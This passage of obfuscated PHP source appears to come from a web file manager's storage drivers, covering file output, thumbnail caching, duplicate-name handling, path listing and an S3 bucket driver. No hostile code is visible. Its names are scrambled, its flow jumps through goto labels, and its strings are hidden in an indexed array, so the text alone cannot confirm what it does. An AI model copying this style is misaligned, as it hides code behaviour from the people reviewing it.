$FèÂÎÛÈ†·); } else { header($D±—¥ªÅ¶[124] . $FèÂÎÛÈ†·); } header($D±—¥ªÅ¶[125] . gmdate($D±—¥ªÅ¶[109], time() + 3600 * 24 * 30) . $D±—¥ªÅ¶[126]); goto Cö“¾Àç¥ª; dåøµšïœ: $d¹áßŒà»Å = $CÒĞ¼©é¶»[$D±—¥ªÅ¶[77]]; $dˆ¼Ã˜…ô = gmdate($D±—¥ªÅ¶[109], $CÒĞ¼©é¶»[$D±—¥ªÅ¶[83]]); $eÒ—‚¤¿¥’ = $DÇÀˆ§‚ã ? $DÇÀˆ§‚ã : $this->iconvApp($CÒĞ¼©é¶»[$D±—¥ªÅ¶[28]]); goto c´‹Åå‘¦Ú; BêÍâÆé‚¸: } public function fileOutServer($e¸é³ã‘Ô³, $añÌôÕê¹ = false, $Bï¢Ö’Ëåã = false, $EÁ½ÅÉƒ†– = '') { $this->fileOut($e¸é³ã‘Ô³, $añÌôÕê¹, $Bï¢Ö’Ëåã, $EÁ½ÅÉƒ†–); } public function fileOutLink($cŠÈÑ§Ô”‰) { header($_SERVER[Š‰][158] . $cŠÈÑ§Ô”‰); die; } public function cacheMethod($aí¨‘›¬Û, $e›©áçŞ™œ, $b÷ÜŠõ½…¢ = null) { goto fŒëƒè³×Í; B°‹‹¬ƒ…¦: if (!is_null($b÷ÜŠõ½…¢)) { $aã˜‚ºãÂ[$cÓÙ£ì§è] = $b÷ÜŠõ½…¢; return; } $FóŞÔî†Ù = isset($aã˜‚ºãÂ[$cÓÙ£ì§è]) ? $aã˜‚ºãÂ[$cÓÙ£ì§è] : null; if (!is_null($FóŞÔî†Ù)) { return $FóŞÔî†Ù; } goto f˜÷êµô‹Ş; E×ÁëÂ¡ùØ: $cÓÙ£ì§è = $D±¸±ó÷ù¨[159] . $aí¨‘›¬Û . $D±¸±ó÷ù¨[160] . rtrim($aÂ¿óÙİÑ, $D±¸±ó÷ù¨[8]); if (is_null($aí¨‘›¬Û)) { $aã˜‚ºãÂ = array(); return; } if (is_null($e›©áçŞ™œ)) { unset($aã˜‚ºãÂ[$cÓÙ£ì§è]); return; } goto B°‹‹¬ƒ…¦; f˜÷êµô‹Ş: $FóŞÔî†Ù = $this->{$aí¨‘›¬Û}($e›©áçŞ™œ); $aã˜‚ºãÂ[$cÓÙ£ì§è] = $FóŞÔî†Ù; return $FóŞÔî†Ù; goto AÍÔÃÌ½ò; fŒëƒè³×Í: $D±¸±ó÷ù¨ =& $_SERVER[Š‰]; static $aã˜‚ºãÂ = array(); $aÂ¿óÙİÑ = $e›©áçŞ™œ ? ltrim($this->getPathOuter($e›©áçŞ™œ), $D±¸±ó÷ù¨[8]) : $e›©áçŞ™œ; goto E×ÁëÂ¡ùØ; AÍÔÃÌ½ò: } public function fileOutImage($d—‚ÚÅµª£, $C×È­§ŠŠ = 250) { goto e©–©“—×‘; cô óÎºÚØ: if (!file_exists($fíèŒ‹–»‘) || filesize($fíèŒ‹–»‘) < 100) { return @file_exists($EÅ—ºê–Œ¹) ? IO::fileOut($EÅ—ºê–Œ¹) : $this->fileOut($d—‚ÚÅµª£); } if (!($Fˆ£°ˆÊ¬ = IO::move($fíèŒ‹–»‘, $cÉÍ˜ò»°›))) { return IO::fileOut($fíèŒ‹–»‘); } del_file($fíèŒ‹–»‘); goto c¤¸¹ÏÛºË; e©–©“—×‘: $Cõ¹††Ÿºç =& $_SERVER[Š‰]; if (substr($d—‚ÚÅµª£, 0, 4) == $Cõ¹††Ÿºç[146]) { $this->fileOutLink($d—‚ÚÅµª£); } $a„Õèˆ™ = $this->info($d—‚ÚÅµª£); goto E³†â‹ˆ½Ï; aÜ¹Çƒ”ä¯: if (!($C…®í–ß¹’ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Cõ¹††Ÿºç[171]))) { $cÉÍ˜ò»°› = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Cõ¹††Ÿºç[172]); } else { $cÉÍ˜ò»°› = KodIO::make($C…®í–ß¹’); } if ($C…®í–ß¹’ = IO::fileNameExist($cÉÍ˜ò»°›, $céƒâ´¹›Ó)) { $fíèŒ‹–»‘ = KodIO::make($C…®í–ß¹’); return IO::fileOut($fíèŒ‹–»‘, !1, $f†—É¸ŒŒ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto D‚î×Ìˆøà; D‚î×Ìˆøà: $fíèŒ‹–»‘ = DATA_THUMB . $céƒâ´¹›Ó; del_file($fíèŒ‹–»‘); if (!@file_exists($fíèŒ‹–»‘)) { $F‰–“ËÙëì = TEMP_FILES; if (!is_dir($F‰–“ËÙëì)) { mk_dir($F‰–“ËÙëì); } $EÅ—ºê–Œ¹ = $F‰–“ËÙëì . $aÛ®«°˜Ó . $Cõ¹††Ÿºç[94] . $a„Õèˆ™[$Cõ¹††Ÿºç[167]]; if (!@file_exists($EÅ—ºê–Œ¹)) { $EÅ—ºê–Œ¹ = $this->download($d—‚ÚÅµª£, $EÅ—ºê–Œ¹); } $EäØ‰ëˆß† = new ImageThumb($EÅ—ºê–Œ¹, $Cõ¹††Ÿºç[173]); $EäØ‰ëˆß†->prorate($fíèŒ‹–»‘, $C×È­§ŠŠ, $C×È­§ŠŠ * 10); } goto cô óÎºÚØ; E³†â‹ˆ½Ï: $f†—É¸ŒŒ = $a„Õèˆ™[$Cõ¹††Ÿºç[28]]; $b®˜‹§„Æ = !1; if (isset($GLOBALS[$Cõ¹††Ÿºç[161]]) && $GLOBALS[$Cõ¹††Ÿºç[161]][$Cõ¹††Ÿºç[75]] == $a„Õèˆ™[$Cõ¹††Ÿºç[75]]) { $AÎÃŠ÷æ… = $GLOBALS[$Cõ¹††Ÿºç[161]][$Cõ¹††Ÿºç[162]]; if (!$a„Õèˆ™[$Cõ¹††Ÿºç[163]]) { $a„Õèˆ™[$Cõ¹††Ÿºç[163]] = $GLOBALS[$Cõ¹††Ÿºç[161]]; } if (isset($AÎÃŠ÷æ…[$Cõ¹††Ÿºç[164]])) { if ($AÎÃŠ÷æ…[$Cõ¹††Ÿºç[164]] <= $C×È­§ŠŠ && $AÎÃŠ÷æ…[$Cõ¹††Ÿºç[165]] <= $C×È­§ŠŠ) { $b®˜‹§„Æ = !0; } } $f†—É¸ŒŒ = $a„Õèˆ™[$Cõ¹††Ÿºç[163]][$Cõ¹††Ÿºç[28]]; } goto AÏÓÃÎˆöé; AÏÓÃÎˆöé: if ($a„Õèˆ™[$Cõ¹††Ÿºç[77]] <= 1024 * 50 || $b®˜‹§„Æ || !function_exists($Cõ¹††Ÿºç[166]) || $a„Õèˆ™[$Cõ¹††Ÿºç[167]] == $Cõ¹††Ÿºç[168]) { return $this->fileOut($d—‚ÚÅµª£, !1, $f†—É¸ŒŒ); } if (isset($a„Õèˆ™[$Cõ¹††Ÿºç[163]][$Cõ¹††Ÿºç[169]])) { $aÛ®«°˜Ó = $a„Õèˆ™[$Cõ¹††Ÿºç[163]][$Cõ¹††Ÿºç[169]]; } else { if (isset($a„Õèˆ™[$Cõ¹††Ÿºç[163]][$Cõ¹††Ÿºç[170]])) { $aÛ®«°˜Ó = $a„Õèˆ™[$Cõ¹††Ÿºç[163]][$Cõ¹††Ÿºç[170]]; } else { $aÛ®«°˜Ó = md5("{$a„Õèˆ™[$Cõ¹††Ÿºç[28]]}\x5f{$a„Õèˆ™[$Cõ¹††Ÿºç[75]]}\x5f{$a„Õèˆ™[$Cõ¹††Ÿºç[77]]}"); } } $céƒâ´¹›Ó = "{$aÛ®«°˜Ó}\x5f{$C×È­§ŠŠ}\56\x70\x6e\x67"; goto aÜ¹Çƒ”ä¯; c¤¸¹ÏÛºË: IO::fileOut($Fˆ£°ˆÊ¬); goto DåéçèØ›‹; DåéçèØ›‹: } public function fileOutImageServer($cˆá‚Ï¶‰£, $DªÁ ÕÂŠ = 250) { $this->fileOutImage($cˆá‚Ï¶‰£, $DªÁ ÕÂŠ); } public function fileNameAuto($cˆ¸˜ŠŞğ, $Bç‹ïˆñ®Û, $A§òƒ†ø» = REPEAT_RENAME, $a®ïøµ½¿§ = false) { goto B´ë…»Êâ—; aÊø«¸Øò¼: if ($A§òƒ†ø» == REPEAT_SKIP) { return !1; } $A‹Á éÛŠª = $F¿Ğ‘‚ŸÀ‹[94] . get_path_ext($Bç‹ïˆñ®Û); $A‹Á éÛŠª = $A‹Á éÛŠª == $F¿Ğ‘‚ŸÀ‹[94] || $a®ïøµ½¿§ ? $F¿Ğ‘‚ŸÀ‹[33] : $A‹Á éÛŠª; goto e¶å‹Â·Î²; e¶å‹Â·Î²: $d„‚‹¢’ƒÈ = 1; $CéƒÂª´š = substr($Bç‹ïˆñ®Û, 0, strlen($Bç‹ïˆñ®Û) - strlen($A‹Á éÛŠª)); $eÔó…š•µ¾ = $CéƒÂª´š . "\x28{$d„‚‹¢’ƒÈ}\51{$A‹Á éÛŠª}"; goto F¼²‹àµë«; B´ë…»Êâ—: $F¿Ğ‘‚ŸÀ‹ =& $_SERVER[Š‰]; $BÆÖ©Û‰ƒ˜ = $cˆ¸˜ŠŞğ === $F¿Ğ‘‚ŸÀ‹[33] ? $Bç‹ïˆñ®Û : rtrim($cˆ¸˜ŠŞğ, $F¿Ğ‘‚ŸÀ‹[8]) . $F¿Ğ‘‚ŸÀ‹[8] . $Bç‹ïˆñ®Û; if ($A§òƒ†ø» == REPEAT_REPLACE || !$this->exist($BÆÖ©Û‰ƒ˜) || $a®ïøµ½¿§ && $A§òƒ†ø» != REPEAT_RENAME_FOLDER) { return $Bç‹ïˆñ®Û; } goto aÊø«¸Øò¼; F¼²‹àµë«: while ($this->exist(rtrim($cˆ¸˜ŠŞğ, $F¿Ğ‘‚ŸÀ‹[8]) . $F¿Ğ‘‚ŸÀ‹[8] . $eÔó…š•µ¾)) { $eÔó…š•µ¾ = $CéƒÂª´š . "\x28{$d„‚‹¢’ƒÈ}\51{$A‹Á éÛŠª}"; $d„‚‹¢’ƒÈ++; } return $eÔó…š•µ¾; goto C´îÌ¯‘Š¢; C´îÌ¯‘Š¢: } private function fileNameAutoList($bê¡ä•Ü©õ, $B†ÛøŞÍ–«, $B…øŸ¦§Ì = false) { goto eèÍ‘´‚ƒ; DÄËß‰‚†: $E‘òğÂêß… = array_to_keyvalue($EãÛ¢¡äÀ, $D˜Ï¿ïéÁÈ[33], $D˜Ï¿ïéÁÈ[28]); $eğ¾ÔÆ¿äŠ = $D˜Ï¿ïéÁÈ[94] . get_path_ext($B†ÛøŞÍ–«); $eğ¾ÔÆ¿äŠ = $eğ¾ÔÆ¿äŠ == $D˜Ï¿ïéÁÈ[94] || $B…øŸ¦§Ì ? $D˜Ï¿ïéÁÈ[33] : $eğ¾ÔÆ¿äŠ; goto Eº±‰‡ä; Eº±‰‡ä: $eæä¹–¶ = substr($B†ÛøŞÍ–«, 0, strlen($B†ÛøŞÍ–«) - strlen($eğ¾ÔÆ¿äŠ)); $eÍÛâ¾¿ñÊ = $eæä¹–¶ . "\x28\60\x29{$eğ¾ÔÆ¿äŠ}"; for ($EÅÌ‹’¾…Ë = 1; $EÅÌ‹’¾…Ë <= count($E‘òğÂêß…) + 1; $EÅÌ‹’¾…Ë++) { $eÍÛâ¾¿ñÊ = $eæä¹–¶ . "\x28{$EÅÌ‹’¾…Ë}\x29{$eğ¾ÔÆ¿äŠ}"; if (!in_array_not_case($eÍÛâ¾¿ñÊ, $E‘òğÂêß…)) { return $eÍÛâ¾¿ñÊ; } } goto b—·İÕÉ¯—; b—·İÕÉ¯—: return $eÍÛâ¾¿ñÊ; goto aÂî«î”³ò; eèÍ‘´‚ƒ: $D˜Ï¿ïéÁÈ =& $_SERVER[Š‰]; $EãÛ¢¡äÀ = $this->listPath($bê¡ä•Ü©õ, !0); $EãÛ¢¡äÀ = array_merge($EãÛ¢¡äÀ[$D˜Ï¿ïéÁÈ[74]], $EãÛ¢¡äÀ[$D˜Ï¿ïéÁÈ[73]]); goto DÄËß‰‚†; aÂî«î”³ò: } public function listAllFiles($aËƒç–Š¶È, $e×Â·Šïİ, $FÎÃ¯ÙŒÂå = array()) { goto aÓ…¬ÍÕµ; aÓ…¬ÍÕµ: $f•âé»šˆ =& $_SERVER[Š‰]; if (empty($e×Â·Šïİ)) { return array(); } $cİÉÕˆ‡áù = array(); goto e‘åÒì¯·¤; F›•ˆ­´â: foreach (array_unique($cİÉÕˆ‡áù) as $f¶‰Ü†ò…©) { $eê’ä¿ãâÃ = array($f•âé»šˆ[75] => $this->getPathOuter($f•âé»šˆ[8] . $aËƒç–Š¶È . $f•âé»šˆ[8] . $f¶‰Ü†ò…©), $f•âé»šˆ[76] => 1, $f•âé»šˆ[77] => 0); if (substr($f¶‰Ü†ò…©, -1) != $f•âé»šˆ[8]) { $eê’ä¿ãâÃ[$f•âé»šˆ[76]] = 0; $BÁ‹¸îÚ‹ = $this->getPath($aËƒç–Š¶È . $f•âé»šˆ[8] . $f¶‰Ü†ò…©); $eê’ä¿ãâÃ[$f•âé»šˆ[77]] = isset($FÎÃ¯ÙŒÂå[$BÁ‹¸îÚ‹]) ? $FÎÃ¯ÙŒÂå[$BÁ‹¸îÚ‹] : $this->size($BÁ‹¸îÚ‹); } $bó§‡„½™Å[] = $eê’ä¿ãâÃ; } return $bó§‡„½™Å; goto Dƒí“—–ù; e‘åÒì¯·¤: $aËƒç–Š¶È = trim($aËƒç–Š¶È, $f•âé»šˆ[8]); foreach ($e×Â·Šïİ as $f¶‰Ü†ò…©) { $eÕÑéÈß…è = ltrim(substr(trim($f¶‰Ü†ò…©, $f•âé»šˆ[8]), strlen($aËƒç–Š¶È)), $f•âé»šˆ[8]); $cİÉÕˆ‡áù = array_merge($cİÉÕˆ‡áù, $this->slicePath($eÕÑéÈß…è)); } $bó§‡„½™Å = array(); goto F›•ˆ­´â; Dƒí“—–ù: } public function slicePath($aäØ…ëñê) { $e÷õª´ê =& $_SERVER[Š‰]; $B±½ÙÍ³¾ = explode($e÷õª´ê[8], trim($aäØ…ëñê, $e÷õª´ê[8])); $BâŞ§¼ßÕŠ = 0; do { ++$BâŞ§¼ßÕŠ; $d×ÖŠ˜ß­Ö[] = implode($e÷õª´ê[8], array_slice($B±½ÙÍ³¾, 0, $BâŞ§¼ßÕŠ)) . $e÷õª´ê[8]; } while ($BâŞ§¼ßÕŠ < count($B±½ÙÍ³¾)); $d×ÖŠ˜ß­Ö[count($B±½ÙÍ³¾) - 1] = $aäØ…ëñê; return $d×ÖŠ˜ß­Ö; } public function getHost() { $Fİ‘¾ŠÆ² =& $_SERVER[Š‰]; $F†¹‚âŸÇ = parse_url(trim($this->domain, $Fİ‘¾ŠÆ²[8])); $Eˆ÷‘¬³ƒ½ = isset($F†¹‚âŸÇ[$Fİ‘¾ŠÆ²[174]]) ? $F†¹‚âŸÇ[$Fİ‘¾ŠÆ²[174]] : http_type(); $aÓºÇŠí‹ = isset($F†¹‚âŸÇ[$Fİ‘¾ŠÆ²[175]]) ? $F†¹‚âŸÇ[$Fİ‘¾ŠÆ²[175]] : $F†¹‚âŸÇ[$Fİ‘¾ŠÆ²[75]]; if (isset($F†¹‚âŸÇ[$Fİ‘¾ŠÆ²[176]])) { $aÓºÇŠí‹ .= $Fİ‘¾ŠÆ²[4] . $F†¹‚âŸÇ[$Fİ‘¾ŠÆ²[176]]; } return $Eˆ÷‘¬³ƒ½ . $Fİ‘¾ŠÆ²[177] . $aÓºÇŠí‹; } public function pathEncode($fõ×˜Ê¡÷ª) { $dÈ¼¢„¹çİ =& $_SERVER[Š‰]; return str_replace($dÈ¼¢„¹çİ[178], $dÈ¼¢„¹çİ[8], rawurlencode($fõ×˜Ê¡÷ª)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($A–Şä¡¹˜ö) { set_timeout(); require_once SDK_DIR . $_SERVER[Š‰][179]; parent::__construct(); $this->_init($A–Şä¡¹˜ö); } public function _init($CòÈŠÉŠŠ•) { foreach ($CòÈŠÉŠŠ• as $E’«Ö– => $Dö§Øğéñ‰) { if (isset($this->{$E’«Ö–})) { $this->{$E’«Ö–} = $Dö§Øğéñ‰; } } $this->endpoint = $CòÈŠÉŠŠ•[$_SERVER[Š‰][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($B»Ò‘ÌÜÔß = "\x76\64") { $this->signVer = $B»Ò‘ÌÜÔß; $this->client->setSignatureVersion($B»Ò‘ÌÜÔß); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto b¿¢÷Ü…¸; b¿¢÷Ü…¸: $f¶’ê¡Ôî =& $_SERVER[Š‰]; $e‡¦êäÆŸ = $this->getBucketCors(); if (!$e‡¦êäÆŸ || !is_array($e‡¦êäÆŸ)) { return !1; } goto b§èäìŸê; b§èäìŸê: if ($e‡¦êäÆŸ[$f¶’ê¡Ôî[181]] != $f¶’ê¡Ôî[182] || $e‡¦êäÆŸ[$f¶’ê¡Ôî[183]] != $f¶’ê¡Ôî[182]) { return !1; } $bøŒ•êãí‡ = array_map($f¶’ê¡Ôî[184], $e‡¦êäÆŸ[$f¶’ê¡Ôî[185]]); if (!is_array($bøŒ•êãí‡)) { $bøŒ•êãí‡ = array(); } goto fğ‡çÜùŒ«; fğ‡çÜùŒ«: $d¦’¼‹Ş¬ë = array($f¶’ê¡Ôî[186], $f¶’ê¡Ôî[187], $f¶’ê¡Ôî[188], $f¶’ê¡Ôî[189], $f¶’ê¡Ôî[190]); $cƒ¨ƒ£ó®© = array_diff($d¦’¼‹Ş¬ë, $bøŒ•êãí‡); return empty($cƒ¨ƒ£ó®©); goto e¯Šñô²Ø; e¯Šñô²Ø: } public function mkfile($fÏ©’›‹‹°, $c¸àªˆõ™· = '', $DİáîÈœƒ¬ = REPEAT_RENAME) { $e’ÎÍ‘’†¥ = $this->setContent($fÏ©’›‹‹°, $c¸àªˆõ™·); if ($e’ÎÍ‘’†¥ !== !1) { return $this->getPathOuter($fÏ©’›‹‹°); } return !1; } public function mkdir($A×†£Å×—ƒ, $dóÔÁ¡òóÁ = REPEAT_SKIP) { if (empty($A×†£Å×—ƒ)) { return !1; } if ($this->_isFolder($A×†£Å×—ƒ)) { return $this->getPathOuter($A×†£Å×—ƒ); } $Eš‰Ùù‹î‡ = $this->setContent($A×†£Å×—ƒ, $_SERVER[Š‰][33], !0); if ($Eš‰Ùù‹î‡ !== !1) { return $this->getPathOuter($A×†£Å×—ƒ); } return !1; } public function copyFile($dßìÕÓ“¾¼, $bé˜ÜÌ‚ˆõ, $FĞñŸì˜ õ = array()) { $E‘›áÛ†Ûù =& $_SERVER[Š‰]; $aÔƒ‰Äª¢£ = $this->objectMeta($dßìÕÓ“¾¼); if (!$aÔƒ‰Äª¢£) { return !1; } if ($aÔƒ‰Äª¢£[$E‘›áÛ†Ûù[77]] <= 1024 * 1024 * 200) { $B¯³´¹† = $this->client->copyObject($this->bucket, $dßìÕÓ“¾¼, $this->bucket, $bé˜ÜÌ‚ˆõ, $E‘›áÛ†Ûù[191], $FĞñŸì˜ õ); } else { $B¯³´¹† = $this->client->multiCopyObject($this->bucket, $dßìÕÓ“¾¼, $this->bucket, $bé˜ÜÌ‚ˆõ, $FĞñŸì˜ õ); } $B¯³´¹† = $B¯³´¹† ? $this->getPathOuter($bé˜ÜÌ‚ˆõ) : !1; return $B¯³´¹†; } public function moveFile($F¢Ô¢×‡êœ, $D»æŸ—³™Š) { if ($this->copyFile($F¢Ô¢×‡êœ, $D»æŸ—³™Š)) { $this->delFile($F¢Ô¢×‡êœ); return $this->getPathOuter($D»æŸ—³™Š); } return !1; } public function delFile($E£õÉŞÄËù) { return $this->client->deleteObject($this->bucket, $E£õÉŞÄËù); } public function delFolder($e©Çğ­ÀŞ´) { goto fÚöêºéÑå; fÚöêºéÑå: $dç¤œ‰ŠÀ =& $_SERVER[Š‰]; if (!$this->exist($e©Çğ­ÀŞ´)) { return !0; } $this->listItemCache = !1; goto DëÁ†‹Òï»; b®ë¾ç±Éğ: return $this->delByBatch($aÂ‰œá÷[$dç¤œ‰ŠÀ[74]]); goto a³Š°òê„; A–×òÁÎƒ¾: if (!empty($e©Çğ­ÀŞ´) && !in_array($aÄò×‰ùÜ¹, $aÂ‰œá÷[$dç¤œ‰ŠÀ[74]])) { $aÂ‰œá÷[$dç¤œ‰ŠÀ[74]][] = $aÄò×‰ùÜ¹; } $EÑ†”©“š = $this->delByBatch($aÂ‰œá÷[$dç¤œ‰ŠÀ[73]]); if (!$EÑ†”©“š) { return !1; } goto b®ë¾ç±Éğ; DëÁ†‹Òï»: $aÂ‰œá÷ = $this->fileList($e©Çğ­ÀŞ´); $this->listItemCache = !0; $aÄò×‰ùÜ¹ = trim($e©Çğ­ÀŞ´, $dç¤œ‰ŠÀ[8]) . $dç¤œ‰ŠÀ[8]; goto A–×òÁÎƒ¾; a³Š°òê„: } private function delByBatch($F™Ö¯®‘Å¿) { foreach (array_chunk($F™Ö¯®‘Å¿, 1000) as $eÎÏçÑàËÉ) { $BõÖŠ÷á‚ = $this->client->deleteObjects($this->bucket, $eÎÏçÑàËÉ); if (!$BõÖŠ÷á‚) { return !1; } } return !0; } public function rename($FÍ·×¦œ“Ù, $eù‚Í‘ÍÙŸ) { return $this->renameObject($FÍ·×¦œ“Ù, $eù‚Í‘ÍÙŸ); } public function listPath($eà½×Œ†Ô, $F‰‹Å¢µ = false) { $B¶²µâ¤²î =& $_SERVER[Š‰]; $D¹Õ‹›œ™Ï = $this->fileList($eà½×Œ†Ô, $B¶²µâ¤²î[8], !0); foreach ($D¹Õ‹›œ™Ï[$B¶²µâ¤²î[74]] as $Bâ®ØéË¢® => $E‡ïºôÉ) { $D¹Õ‹›œ™Ï[$B¶²µâ¤²î[74]][$Bâ®ØéË¢®] = $this->folderInfo($E‡ïºôÉ, $F‰‹Å¢µ); } foreach ($D¹Õ‹›œ™Ï[$B¶²µâ¤²î[73]] as $Bâ®ØéË¢® => $E‡ïºôÉ) { $D¹Õ‹›œ™Ï[$B¶²µâ¤²î[73]][$Bâ®ØéË¢®] = $this->fileInfo($E‡ïºôÉ[$B¶²µâ¤²î[28]], $F‰‹Å¢µ, $E‡ïºôÉ); } return $D¹Õ‹›œ™Ï; } private function fileInfo($bÉù‘ÙÀŠâ, $DİÌ„œŒ²à = false, $BÅÊ¾¤Œöæ = array()) { goto E¥áÚÅÕ‘; aè¶»ä‹¹²: if (isset($BÅÊ¾¤Œöæ[$B‰åé‡ÑóÜ[195]])) { $eé˜Ú¹ÆÒÕ[$B‰åé‡ÑóÜ[83]] = $BÅÊ¾¤Œöæ[$B‰åé‡ÑóÜ[195]]; } if (isset($BÅÊ¾¤Œöæ[$B‰åé‡ÑóÜ[77]])) { $eé˜Ú¹ÆÒÕ[$B‰åé‡ÑóÜ[77]] = $BÅÊ¾¤Œöæ[$B‰åé‡ÑóÜ[77]]; } return $eé˜Ú¹ÆÒÕ; goto e÷äß÷†Õ; E¥áÚÅÕ‘: $B‰åé‡ÑóÜ =& $_SERVER[Š‰]; $eé˜Ú¹ÆÒÕ = array($B‰åé‡ÑóÜ[28] => $this->pathThis($bÉù‘ÙÀŠâ), $B‰åé‡ÑóÜ[75] => $this->getPathOuter($bÉù‘ÙÀŠâ), $B‰åé‡ÑóÜ[29] => $B‰åé‡ÑóÜ[173], $B‰åé‡ÑóÜ[167] => $this->ext($bÉù‘ÙÀŠâ), $B‰åé‡ÑóÜ[77] => isset($BÅÊ¾¤Œöæ[$B‰åé‡ÑóÜ[77]]) ? $BÅÊ¾¤Œöæ[$B‰åé‡ÑóÜ[77]] : 0); if ($DİÌ„œŒ²à) { return $eé˜Ú¹ÆÒÕ; } goto e¹“ÊãÎ‘¦; e¹“ÊãÎ‘¦: $eé˜Ú¹ÆÒÕ[$B‰åé‡ÑóÜ[192]] = $eé˜Ú¹ÆÒÕ[$B‰åé‡ÑóÜ[83]] = 0; $eé˜Ú¹ÆÒÕ[$B‰åé‡ÑóÜ[193]] = $eé˜Ú¹ÆÒÕ[$B‰åé‡ÑóÜ[194]] = !0; if (empty($BÅÊ¾¤Œöæ)) { $BÅÊ¾¤Œöæ = $this->objectMeta($bÉù‘ÙÀŠâ); if (!$BÅÊ¾¤Œöæ) { return $eé˜Ú¹ÆÒÕ; } } goto aè¶»ä‹¹²; e÷äß÷†Õ: } private function folderInfo($aä·»Ö“ÉÊ, $a†äÇïÀ• = false) { goto C¦˜¹¬§ÂÚ; dßµÕˆß •: $b„ğö°Ö[$a¸æŒù®êï[192]] = $b„ğö°Ö[$a¸æŒù®êï[83]] = 0; $b„ğö°Ö[$a¸æŒù®êï[193]] = $b„ğö°Ö[$a¸æŒù®êï[194]] = !0; if ($aä·»Ö“ÉÊ == $a¸æŒù®êï[33]) { return $b„ğö°Ö; } goto aéŒç„…‹; aÄ ‹óÚ: return $b„ğö°Ö; goto CÒŒ‡Ş‡Ù; C¦˜¹¬§ÂÚ: $a¸æŒù®êï =& $_SERVER[Š‰]; $b„ğö°Ö = array($a¸æŒù®êï[28] => $this->pathThis($aä·»Ö“ÉÊ), $a¸æŒù®êï[75] => $this->getPathOuter($a¸æŒù®êï[8] . $aä·»Ö“ÉÊ), $a¸æŒù®êï[29] => $a¸æŒù®êï[76]); if ($a†äÇïÀ•) { return $b„ğö°Ö; } goto dßµÕˆß •; aéŒç„…‹: $aä·»Ö“ÉÊ = trim($aä·»Ö“ÉÊ, $a¸æŒù®êï[8]) . $a¸æŒù®êï[8]; $CÌµØ¥´¡É = $this->objectMeta($aä·»Ö“ÉÊ); if (isset($CÌµØ¥´¡É[$a¸æŒù®êï[195]])) { $b„ğö°Ö[$a¸æŒù®êï[192]] = $CÌµØ¥´¡É[$a¸æŒù®êï[195]]; } goto aÄ ‹óÚ; CÒŒ‡Ş‡Ù: } private function fileList($fá…óê¤œ, $B„ÈÜ«„‘ë = '', $d•ÌŠó«Ï = 0) { goto açÎİ˜“ù‰; açÎİ˜“ù‰: $A¡¸ƒÁ„…¿ =& $_SERVER[Š‰]; $f—ˆÆšÕ•± = rtrim($fá…óê¤œ, $A¡¸ƒÁ„…¿[8]) . $A¡¸ƒÁ„…¿[8]; $fƒñá¿‹ = $this->listObjs($f—ˆÆšÕ•±, null, null, $B„ÈÜ«„‘ë); goto DÎµ±Öô‹‡; F¶š¤†¡Ú¶: foreach ($fƒñá¿‹[$A¡¸ƒÁ„…¿[196]] as $dÅÅñ‚›²’) { goto eŒ›Ö’ğñ; cÇê®å¦®ò: $b¡¤Àö›¬ç[] = $d•ÌŠó«Ï ? $dÅÅñ‚›²’ : $cÃÉ•¡ì˜Û; goto D†ÕáÇí¸ß; CÕ‡É¥ó¡”: $FåÒ‘„’÷ò = $FÙìôéò‰± == 0 && substr($cÃÉ•¡ì˜Û, strlen($cÃÉ•¡ì˜Û) - 1, 1) == $A¡¸ƒÁ„…¿[8] ? !0 : !1; if ($fë¼—ˆ¢ì§) { $this->cacheMethod($A¡¸ƒÁ„…¿[197], $cÃÉ•¡ì˜Û, $FåÒ‘„’÷ò); $this->cacheMethod($A¡¸ƒÁ„…¿[198], $cÃÉ•¡ì˜Û, $dÅÅñ‚›²’); } if ($FåÒ‘„’÷ò) { $D›É½°†íˆ[] = $cÃÉ•¡ì˜Û; continue; } goto cÇê®å¦®ò; eŒ›Ö’ğñ: $cÃÉ•¡ì˜Û = $dÅÅñ‚›²’[$A¡¸ƒÁ„…¿[28]]; if ($cÃÉ•¡ì˜Û == $f—ˆÆšÕ•±) { continue; } $FÙìôéò‰± = isset($dÅÅñ‚›²’[$A¡¸ƒÁ„…¿[77]]) ? $dÅÅñ‚›²’[$A¡¸ƒÁ„…¿[77]] : 0; goto CÕ‡É¥ó¡”; D†ÕáÇí¸ß: } foreach ($fƒñá¿‹[$A¡¸ƒÁ„…¿[199]] as $dÅÅñ‚›²’) { $D›É½°†íˆ[] = $dÅÅñ‚›²’[$A¡¸ƒÁ„…¿[28]]; if ($fë¼—ˆ¢ì§) { $this->cacheMethod($A¡¸ƒÁ„…¿[197], $dÅÅñ‚›²’[$A¡¸ƒÁ„…¿[28]], !0); } } if ($fë¼—ˆ¢ì§) { $this->cacheMethod($A¡¸ƒÁ„…¿[197], $fá…óê¤œ, !0); } goto c¶‚ğ…ó™è; DÎµ±Öô‹‡: if (!$fƒñá¿‹) { return array($A¡¸ƒÁ„…¿[74] => array(), $A¡¸ƒÁ„…¿[73] => array()); } $fë¼—ˆ¢ì§ = $this->listItemCache === !1 ? !1 : !0; $D›É½°†íˆ = $b¡¤Àö›¬ç = array(); goto F¶š¤†¡Ú¶; c¶‚ğ…ó™è: return array($A¡¸ƒÁ„…¿[74] => $D›É½°†íˆ, $A¡¸ƒÁ„…¿[73] => $b¡¤Àö›¬ç); goto C¼øäÍ…¹; C¼øäÍ…¹: } private function listObjs($a‰´‡Ê·Š„, $eÆ‘Ğ”ÏĞ = null, $BĞ¦ò†Å¬Œ = null, $AÉ´ôˆ¨ ª = null) { $B‚ßõÕ¶ù =& $_SERVER[Š‰]; $a‰´‡Ê·Š„ = trim($a‰´‡Ê·Š„, $B‚ßõÕ¶ù[8]); $F÷Ù÷´…ë¬ = empty($a‰´‡Ê·Š„) ? $B‚ßõÕ¶ù[33] : $a‰´‡Ê·Š„ . $B‚ßõÕ¶ù[8]; return $this->client->getBucket($this->bucket, $F÷Ù÷´…ë¬, 